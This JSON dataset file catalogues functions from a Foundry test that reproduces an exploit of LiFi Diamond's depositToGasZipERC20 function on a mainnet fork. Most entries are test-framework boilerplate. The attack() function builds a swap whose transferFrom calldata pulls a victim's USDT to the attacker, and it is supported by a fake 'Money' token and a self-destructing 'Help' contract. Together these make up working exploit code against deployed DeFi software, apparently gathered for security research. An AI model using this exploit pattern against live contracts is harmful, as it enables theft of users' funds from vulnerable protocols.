[
  {
    "contract/interface": "LiFiDiamond",
    "source_type": "victim_contract",
    "function_name": "depositToGasZipERC20",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        money = new Money();\n        LibSwap.SwapData memory swapData = LibSwap.SwapData({\n            callTo: address(USDT),\n            approveTo: address(this),\n            sendingAssetId: address(money),\n            receivingAssetId: address(money),\n            fromAmount: 1,\n            callData: abi.encodeWithSelector(bytes4(0x23b872dd), address(Victim), address(this), 2_276_295_880_553),\n            requiresDeposit: true\n        });\n\n        Vulncontract.depositToGasZipERC20(swapData, 0, address(this));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_318_962);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExpolit",
    "original_code": "    function testExpolit() public {\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        attack();\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), USDT.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Help",
    "source_type": "attacker_contract",
    "function_name": "sendto",
    "original_code": "    function sendto(\n        address who\n    ) external payable {\n        (bool success, bytes memory retData) = address(Vulncontract).call{value: msg.value}(\"\");\n        require(success, \"Error\");\n        selfdestruct(payable(msg.sender));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address _owner, address spender) external view returns (uint256) {\n        return 0;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external returns (bool) {\n        help = new Help();\n        help.sendto{value: 1}(address(Vulncontract));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Money",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address who\n    ) external view returns (uint256) {\n        return 1;\n    }\n\n",
    "description": ""
  }
]